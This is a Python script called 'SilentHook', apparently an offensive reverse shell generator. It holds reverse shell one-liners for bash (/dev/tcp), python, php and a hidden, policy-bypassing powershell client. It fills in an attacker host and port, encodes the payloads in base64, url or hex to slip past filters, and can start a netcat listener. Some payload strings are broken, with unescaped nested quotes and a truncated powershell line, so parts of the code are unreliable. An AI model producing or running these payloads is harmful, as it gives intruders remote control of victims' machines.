#!/usr/bin/env python3
# SilentHook – "It whispers, then takes control."
# Coded by MR.S13xVoid

import base64, urllib.parse, argparse, os, time
from pathlib import Path

BANNER = r"""
   ____  _ _ _           _   _              _    
  / ___|| (_)_ __  _   _| | | | ___  ___ __| | __
  \___ \| | | '_ \| | | | |_| |/ _ \/ __/ _` |/ /
   ___) | | | | | | |_| |  _  |  __/ (_| (_|   < 
  |____/|_|_|_| |_|\__, |_| |_|\___|\___\__,_|\_\
                   |___/      by MR.S13xVoid    
"""

payloads = {
    "bash": 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
    "python": 'python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'',
    "php": 'php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'',
    "powershell": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,...
}

def encode_payload(payload, method):
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif method == "url":
        return urllib.parse.quote(payload)
    elif method == "hex":
        return payload.encode().hex()
    return payload

def save_output(payload, encoded, lhost, lport, shell_type, encode_type):
    output_dir = Path("output")
    output_dir.mkdir(exist_ok=True)
    out_file = output_dir / f"payload_{shell_type}_{lhost}_{lport}.txt"
    with open(out_file, "w") as f:
        f.write(f"# SilentHook Payload\n")
        f.write(f"# Type: {shell_type}, Encode: {encode_type}\n\n")
        f.write(f"Original:\n{payload}\n\nEncoded:\n{encoded}\n")
    print(f"[✔] Payload saved to: {out_file}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="SilentHook - Reverse Shell Generator")
    parser.add_argument("--type", required=True, choices=payloads.keys(), help="Payload type")
    parser.add_argument("--lhost", required=True, help="Your IP")
    parser.add_argument("--lport", required=True, help="Your Port")
    parser.add_argument("--encode", choices=["base64", "url", "hex", "none"], default="none", help="Encoding type")
    parser.add_argument("--silent", action="store_true", help="Silent mode (no output, just save)")
    parser.add_argument("--listener", action="store_true", help="Start netcat listener")
    args = parser.parse_args()

    shell = payloads[args.type].format(host=args.lhost, port=args.lport)
    encoded = encode_payload(shell, args.encode)

    if not args.silent:
        print(f"\n[+] Payload: \n{shell}")
        if args.encode != "none":
            print(f"\n[+] Encoded ({args.encode}): \n{encoded}")
    save_output(shell, encoded, args.lhost, args.lport, args.type, args.encode)

    if args.listener:
        print(f"\n[+] Starting netcat listener on port {args.lport}...\n")
        os.system(f"nc -lvnp {args.lport}")

if __name__ == "__main__":
    main()
